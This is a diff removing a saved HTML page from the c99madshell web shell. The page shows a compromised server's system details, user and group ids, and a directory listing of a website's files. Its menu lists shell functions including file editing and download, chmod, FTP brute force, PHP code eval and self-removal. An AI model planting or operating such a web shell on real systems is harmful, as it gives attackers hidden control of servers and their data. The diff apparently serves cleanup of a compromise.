@@ -1,549 +1,433 @@
-<html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1251"><meta http-equiv="Content-Language" content="en-us"><title> - c99madshell</title><STYLE>TD { FONT-SIZE: 8pt; COLOR: #ebebeb; FONT-FAMILY: verdana;}BODY { scrollbar-face-color: #800000; scrollbar-shadow-color: #101010; scrollbar-highlight-color: #101010; scrollbar-3dlight-color: #101010; scrollbar-darkshadow-color: #101010; scrollbar-track-color: #101010; scrollbar-arrow-color: #101010; font-family: Verdana;}TD.header { FONT-WEIGHT: normal; FONT-SIZE: 10pt; BACKGROUND: #7d7474; COLOR: white; FONT-FAMILY: verdana;}A { FONT-WEIGHT: normal; COLOR: #dadada; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A.Links { COLOR: #ffffff; TEXT-DECORATION: none;}A.Links:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; TEXT-DECORATION: none;}A:hover { COLOR: #ffffff; TEXT-DECORATION: underline;}.skin0{position:absolute; width:200px; border:2px solid black; background-color:menu; font-family:Verdana; line-height:20px; cursor:default; visibility:hidden;;}.skin1{cursor: default; font: menutext; position: absolute; width: 145px; background-color: menu; border: 1 solid buttonface;visibility:hidden; border: 2 outset buttonhighlight; font-family: Verdana,Geneva, Arial; font-size: 10px; color: black;}.menuitems{padding-left:15px; padding-right:10px;;}input{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}textarea{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}button{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}select{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}option {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}iframe {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}p {MARGIN-TOP: 0px; MARGIN-BOTTOM: 0px; LINE-HEIGHT: 150%}blockquote{ font-size: 8pt; font-family: Courier, Fixed, Arial; border : 8px solid #A9A9A9; padding: 1em; margin-top: 1em; margin-bottom: 5em; margin-right: 3em; margin-left: 4em; background-color: #B7B2B0;}body,td,th { font-family: verdana; color: #d9d9d9; font-size: 11px;}body { background-color: #000000;}</style></head><BODY text=#ffffff bottomMargin=0 bgColor=#000000 leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwidth=0><form name='todo' method='POST'><input name='act' type='hidden' value=''><input name='grep' type='hidden' value=''><input name='fullhexdump' type='hidden' value=''><input name='base64' type='hidden' value=''><input name='nixpasswd' type='hidden' value=''><input name='pid' type='hidden' value=''><input name='c' type='hidden' value=''><input name='white' type='hidden' value=''><input name='sig' type='hidden' value=''><input name='processes_sort' type='hidden' value=''><input name='d' type='hidden' value=''><input name='sort' type='hidden' value=''><input name='f' type='hidden' value=''><input name='ft' type='hidden' value=''></form><center><TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1 bordercolor="#C0C0C0"><tr><th width="101%" height="15" nowrap bordercolor="#C0C0C0" valign="top" colspan="2"><p><font face=Webdings size=6><b>!</b></font><a href="cp/scripts/chat-doc/vote.php"><font face="Verdana" size="5"><b>C99madShell v. 2.0 madnet edition</b></font></a><font face=Webdings size=6><b>!</b></font></p></center></th></tr><tr><td><p align="left"><b>Software:&nbsp;. <a href="#" onclick="document.todo.act.value='phpinfo';document.todo.submit();"><b><u>PHP/5.3.10-1ubuntu3.13</u></b></a></b>&nbsp;</p><p align="left"><b>uname -a:&nbsp;Linux andrew-vipshop-3010 3.5.0-51-generic #77~precise1-Ubuntu SMP Thu Jun 5 00:48:28 UTC<br>2014 x86_64</b>&nbsp;</p><p align="left"><b>uid=1000(andrew) gid=1000(andrew)<br>组=1000(andrew),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare<br>)</b>&nbsp;</p><p align="left"><b>Safe-mode:&nbsp;<font color=green>OFF (not secure)</font></b></p><p align="left"><a href="#" onclick="document.todo.act.value='ls';document.todo.d.value='%2F';document.todo.sort.value='0a';document.todo.submit();"><b>/</b></a><a href="#" onclick="document.todo.act.value='ls';document.todo.d.value='%2Fhome%2F';document.todo.sort.value='0a';document.todo.submit();"><b>home/</b></a><a href="#" onclick="document.todo.act.value='ls';document.todo.d.value='%2Fhome%2Fandrew%2F';document.todo.sort.value='0a';document.todo.submit();"><b>andrew/</b></a><a href="#" onclick="document.todo.act.value='ls';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2F';document.todo.sort.value='0a';document.todo.submit();"><b>work/</b></a><a href="#" onclick="document.todo.act.value='ls';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2F';document.todo.sort.value='0a';document.todo.submit();"><b>ibscontrols/</b></a><a href="#" onclick="document.todo.act.value='ls';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com%2F';document.todo.sort.value='0a';document.todo.submit();"><b>ibs-controls.com/</b></a>&nbsp;&nbsp;&nbsp;<b><font color=green>drwx--xr-x</font></b><br><b>Free 330.87 GB of 454.54 GB (72.79%)</b><br><a href="cp/scripts/chat-doc/vote.php"><b><hr>HOME</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href="#" onclick="history.back(1)"><b><=</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href="#" onclick="history.go(1)"><b>=></b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href="#" onclick="document.todo.act.value='ls';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols';document.todo.sort.value='0a';document.todo.submit();"><b>UPDIR</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href="#" onclick="document.todo.act.value='search';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com%2F';document.todo.submit();"><b>Search</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href="#" onclick="document.todo.act.value='fsbuff';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com%2F';document.todo.submit();"><b>Buffer</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href="#" onclick="document.todo.act.value='tools';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com%2F';document.todo.submit();"><b>Tools</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href="#" onclick="document.todo.act.value='processes';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com%2F';document.todo.submit();"><b>Proc.</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href="#" onclick="document.todo.act.value='ftpquickbrute';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com%2F';document.todo.submit();"><b>FTP brute</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href="#" onclick="document.todo.act.value='security';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com%2F';document.todo.submit();"><b>Sec.</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href="#" onclick="document.todo.act.value='sql';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com%2F';document.todo.submit();"><b>SQL</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href="#" onclick="document.todo.act.value='eval';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com%2F';document.todo.submit();"><b>PHP-code</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href="#" onclick="document.todo.act.value='selfremove';document.todo.submit();"><b>Self remove</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href="#" onclick="if (confirm('Are you sure?')) window.close()"><b>Logout</b></a>&nbsp;&nbsp;&nbsp;&nbsp;</p></td></tr></table><br><TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width="100%" valign="top"><center><b>Owned by root</b></center></td></tr></table><br><TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width="100%" valign="top"><center><b>Listing folder (49 files and 12 folders):</b></center><br><TABLE cellSpacing=0 cellPadding=0 width=100% bgColor=#333333 borderColorLight=#433333 border=0><form method=POST name="ls_form"><input type=hidden name=act value=ls><input type=hidden name=d value=/home/andrew/work/ibscontrols/ibs-controls.com/><tr>
-<td><b>Name</b><a href="#" onclick="document.todo.act.value='ls';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com%2F';document.todo.sort.value='0d;document.todo.submit();"></td>
-<td><a href="#" onclick="document.todo.act.value='ls';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com%2F';document.todo.sort.value='1a';document.todo.submit();"><b>Size</b></a></td>
-<td><a href="#" onclick="document.todo.act.value='ls';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com%2F';document.todo.sort.value='2a';document.todo.submit();"><b>Modify</b></a></td>
-<td><a href="#" onclick="document.todo.act.value='ls';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com%2F';document.todo.sort.value='3a';document.todo.submit();"><b>Owner/Group</b></a></td>
-<td><a href="#" onclick="document.todo.act.value='ls';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com%2F';document.todo.sort.value='4a';document.todo.submit();"><b>Perms</b></a></td>
-<td><b>Action</b></td>
-</tr>
-<tr>
-<td><a href="#" onclick="document.todo.act.value='ls';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols';document.todo.sort.value='0a';document.todo.submit();">..</a></td>
-<td>LINK</td>
-<td>10.11.2014 17:21:20</td>
-<td>andrew/andrew</td>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='chmod';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='..';document.todo.submit();"><b><font color=green>drwxrwxr-x</font></b></a></td>
-<td><a href="#" onclick="document.todo.act.value='d';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com%2F..';document.todo.submit();">I</a>&nbsp;<input type="checkbox" name="actbox[]" id="actbox0" value="/home/andrew/work/ibscontrols/ibs-controls.com/.."></td>
-</tr>
-<tr>
-<td><a href="#" onclick="document.todo.act.value='ls';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.sort.value='0a';document.todo.submit();">.</a></td>
-<td>LINK</td>
-<td>17.12.2014 10:12:32</td>
-<td>andrew/andrew</td>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='chmod';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='.';document.todo.submit();"><b><font color=green>drwx--xr-x</font></b></a></td>
-<td><a href="#" onclick="document.todo.act.value='d';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com%2F.';document.todo.submit();">I</a>&nbsp;<input type="checkbox" name="actbox[]" onclick="ls_reverse_all();"></td>
-</tr>
-<tr>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='ls';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com%2F_public';document.todo.sort.value='0a';document.todo.submit();">[_public]</a></td>
-<td>DIR</td>
-<td>03.11.2014 11:54:38</td>
-<td>andrew/andrew</td>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='chmod';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='_public';document.todo.submit();"><b><font color=green>drwxrwxr-x</font></b></a></td>
-<td><a href="#" onclick="document.todo.act.value='d';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com%2F_public';document.todo.submit();">I</a>&nbsp;<input type="checkbox" name="actbox[]" id="actbox1" value="/home/andrew/work/ibscontrols/ibs-controls.com/_public"></td>
-</tr>
-<tr>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='ls';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com%2Fadmin';document.todo.sort.value='0a';document.todo.submit();">[admin]</a></td>
-<td>DIR</td>
-<td>18.08.2014 11:17:24</td>
-<td>andrew/andrew</td>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='chmod';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='admin';document.todo.submit();"><b><font color=green>drwx---r-x</font></b></a></td>
-<td><a href="#" onclick="document.todo.act.value='d';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com%2Fadmin';document.todo.submit();">I</a>&nbsp;<input type="checkbox" name="actbox[]" id="actbox2" value="/home/andrew/work/ibscontrols/ibs-controls.com/admin"></td>
-</tr>
-<tr>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='ls';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com%2Fcgi-bin';document.todo.sort.value='0a';document.todo.submit();">[cgi-bin]</a></td>
-<td>DIR</td>
-<td>15.08.2014 11:13:30</td>
-<td>andrew/andrew</td>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='chmod';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='cgi-bin';document.todo.submit();"><b><font color=green>drwxr-xr-x</font></b></a></td>
-<td><a href="#" onclick="document.todo.act.value='d';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com%2Fcgi-bin';document.todo.submit();">I</a>&nbsp;<input type="checkbox" name="actbox[]" id="actbox3" value="/home/andrew/work/ibscontrols/ibs-controls.com/cgi-bin"></td>
-</tr>
-<tr>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='ls';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com%2Fcheckout';document.todo.sort.value='0a';document.todo.submit();">[checkout]</a></td>
-<td>DIR</td>
-<td>15.08.2014 11:58:43</td>
-<td>andrew/andrew</td>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='chmod';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='checkout';document.todo.submit();"><b><font color=green>drwx---r-x</font></b></a></td>
-<td><a href="#" onclick="document.todo.act.value='d';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com%2Fcheckout';document.todo.submit();">I</a>&nbsp;<input type="checkbox" name="actbox[]" id="actbox4" value="/home/andrew/work/ibscontrols/ibs-controls.com/checkout"></td>
-</tr>
-<tr>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='ls';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com%2Fcommon';document.todo.sort.value='0a';document.todo.submit();">[common]</a></td>
-<td>DIR</td>
-<td>18.08.2014 12:09:03</td>
-<td>andrew/andrew</td>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='chmod';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='common';document.todo.submit();"><b><font color=green>drwx---r-x</font></b></a></td>
-<td><a href="#" onclick="document.todo.act.value='d';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com%2Fcommon';document.todo.submit();">I</a>&nbsp;<input type="checkbox" name="actbox[]" id="actbox5" value="/home/andrew/work/ibscontrols/ibs-controls.com/common"></td>
-</tr>
-<tr>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='ls';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com%2Fcp';document.todo.sort.value='0a';document.todo.submit();">[cp]</a></td>
-<td>DIR</td>
-<td>21.05.2008 21:19:12</td>
-<td>andrew/andrew</td>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='chmod';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='cp';document.todo.submit();"><b><font color=green>drwx---r-x</font></b></a></td>
-<td><a href="#" onclick="document.todo.act.value='d';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com%2Fcp';document.todo.submit();">I</a>&nbsp;<input type="checkbox" name="actbox[]" id="actbox6" value="/home/andrew/work/ibscontrols/ibs-controls.com/cp"></td>
-</tr>
-<tr>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='ls';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com%2Fftp';document.todo.sort.value='0a';document.todo.submit();">[ftp]</a></td>
-<td>DIR</td>
-<td>20.07.2008 10:15:39</td>
-<td>andrew/andrew</td>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='chmod';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='ftp';document.todo.submit();"><b><font color=green>drwx---r-x</font></b></a></td>
-<td><a href="#" onclick="document.todo.act.value='d';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com%2Fftp';document.todo.submit();">I</a>&nbsp;<input type="checkbox" name="actbox[]" id="actbox7" value="/home/andrew/work/ibscontrols/ibs-controls.com/ftp"></td>
-</tr>
-<tr>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='ls';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com%2Fimages';document.todo.sort.value='0a';document.todo.submit();">[images]</a></td>
-<td>DIR</td>
-<td>20.12.2008 10:15:58</td>
-<td>andrew/andrew</td>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='chmod';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='images';document.todo.submit();"><b><font color=green>drwxrwxrwx</font></b></a></td>
-<td><a href="#" onclick="document.todo.act.value='d';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com%2Fimages';document.todo.submit();">I</a>&nbsp;<input type="checkbox" name="actbox[]" id="actbox8" value="/home/andrew/work/ibscontrols/ibs-controls.com/images"></td>
-</tr>
-<tr>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='ls';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com%2Flib';document.todo.sort.value='0a';document.todo.submit();">[lib]</a></td>
-<td>DIR</td>
-<td>21.05.2008 21:19:11</td>
-<td>andrew/andrew</td>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='chmod';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='lib';document.todo.submit();"><b><font color=green>drwx---r-x</font></b></a></td>
-<td><a href="#" onclick="document.todo.act.value='d';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com%2Flib';document.todo.submit();">I</a>&nbsp;<input type="checkbox" name="actbox[]" id="actbox9" value="/home/andrew/work/ibscontrols/ibs-controls.com/lib"></td>
-</tr>
-<tr>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='ls';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com%2Fpdfs';document.todo.sort.value='0a';document.todo.submit();">[pdfs]</a></td>
-<td>DIR</td>
-<td>25.10.2008 14:22:19</td>
-<td>andrew/andrew</td>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='chmod';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='pdfs';document.todo.submit();"><b><font color=green>drwx---r-x</font></b></a></td>
-<td><a href="#" onclick="document.todo.act.value='d';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com%2Fpdfs';document.todo.submit();">I</a>&nbsp;<input type="checkbox" name="actbox[]" id="actbox10" value="/home/andrew/work/ibscontrols/ibs-controls.com/pdfs"></td>
-</tr>
-<tr>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='ls';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com%2Fusers';document.todo.sort.value='0a';document.todo.submit();">[users]</a></td>
-<td>DIR</td>
-<td>31.10.2014 17:00:31</td>
-<td>andrew/andrew</td>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='chmod';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='users';document.todo.submit();"><b><font color=green>drwxrwxr-x</font></b></a></td>
-<td><a href="#" onclick="document.todo.act.value='d';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com%2Fusers';document.todo.submit();">I</a>&nbsp;<input type="checkbox" name="actbox[]" id="actbox11" value="/home/andrew/work/ibscontrols/ibs-controls.com/users"></td>
-</tr>
-<tr>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='ls';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com%2Fwebalizer';document.todo.sort.value='0a';document.todo.submit();">[webalizer]</a></td>
-<td>DIR</td>
-<td>01.05.2009 14:22:02</td>
-<td>andrew/andrew</td>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='chmod';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='webalizer';document.todo.submit();"><b><font color=green>drwxr-xr-x</font></b></a></td>
-<td><a href="#" onclick="document.todo.act.value='d';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com%2Fwebalizer';document.todo.submit();">I</a>&nbsp;<input type="checkbox" name="actbox[]" id="actbox12" value="/home/andrew/work/ibscontrols/ibs-controls.com/webalizer"></td>
-</tr>
-<tr>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='Sitemap.xml';document.todo.submit();">Sitemap.xml</a></td>
-<td>279 B</td>
-<td>02.12.2008 10:42:05</td>
-<td>andrew/andrew</td>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='chmod';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='Sitemap.xml';document.todo.submit();"><b><font color=green>-rw-r--r--</font></b></a></td>
-<td><a href="#" onclick="document.todo.act.value='f';document.todo.f.value='Sitemap.xml';document.todo.ft.value='info';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">I</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='Sitemap.xml';document.todo.ft.value='edit';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">E</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='Sitemap.xml';document.todo.ft.value='download';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">D</a>&nbsp;<input type="checkbox" name="actbox[]" id="actbox13" value="/home/andrew/work/ibscontrols/ibs-controls.com/Sitemap.xml"></td>
-</tr>
-<tr>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='about.php';document.todo.submit();">about.php</a></td>
-<td>111 B</td>
-<td>21.05.2008 21:19:12</td>
-<td>andrew/andrew</td>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='chmod';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='about.php';document.todo.submit();"><b><font color=green>-rw-r--r--</font></b></a></td>
-<td><a href="#" onclick="document.todo.act.value='f';document.todo.f.value='about.php';document.todo.ft.value='info';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">I</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='about.php';document.todo.ft.value='edit';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">E</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='about.php';document.todo.ft.value='download';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">D</a>&nbsp;<input type="checkbox" name="actbox[]" id="actbox14" value="/home/andrew/work/ibscontrols/ibs-controls.com/about.php"></td>
-</tr>
-<tr>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='andrew.css';document.todo.submit();">andrew.css</a></td>
-<td>0 B</td>
-<td>21.05.2008 21:19:12</td>
-<td>andrew/andrew</td>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='chmod';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='andrew.css';document.todo.submit();"><b><font color=green>-rw-r--r--</font></b></a></td>
-<td><a href="#" onclick="document.todo.act.value='f';document.todo.f.value='andrew.css';document.todo.ft.value='info';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">I</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='andrew.css';document.todo.ft.value='edit';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">E</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='andrew.css';document.todo.ft.value='download';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">D</a>&nbsp;<input type="checkbox" name="actbox[]" id="actbox15" value="/home/andrew/work/ibscontrols/ibs-controls.com/andrew.css"></td>
-</tr>
-<tr>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='andrew.php';document.todo.submit();">andrew.php</a></td>
-<td>87 B</td>
-<td>21.05.2008 21:19:12</td>
-<td>andrew/andrew</td>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='chmod';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='andrew.php';document.todo.submit();"><b><font color=green>-rw-r--r--</font></b></a></td>
-<td><a href="#" onclick="document.todo.act.value='f';document.todo.f.value='andrew.php';document.todo.ft.value='info';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">I</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='andrew.php';document.todo.ft.value='edit';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">E</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='andrew.php';document.todo.ft.value='download';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">D</a>&nbsp;<input type="checkbox" name="actbox[]" id="actbox16" value="/home/andrew/work/ibscontrols/ibs-controls.com/andrew.php"></td>
-</tr>
-<tr>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='application.php';document.todo.submit();">application.php</a></td>
-<td>1.76 KB</td>
-<td>21.08.2014 09:45:23</td>
-<td>andrew/andrew</td>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='chmod';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='application.php';document.todo.submit();"><b><font color=green>-rw-r--r--</font></b></a></td>
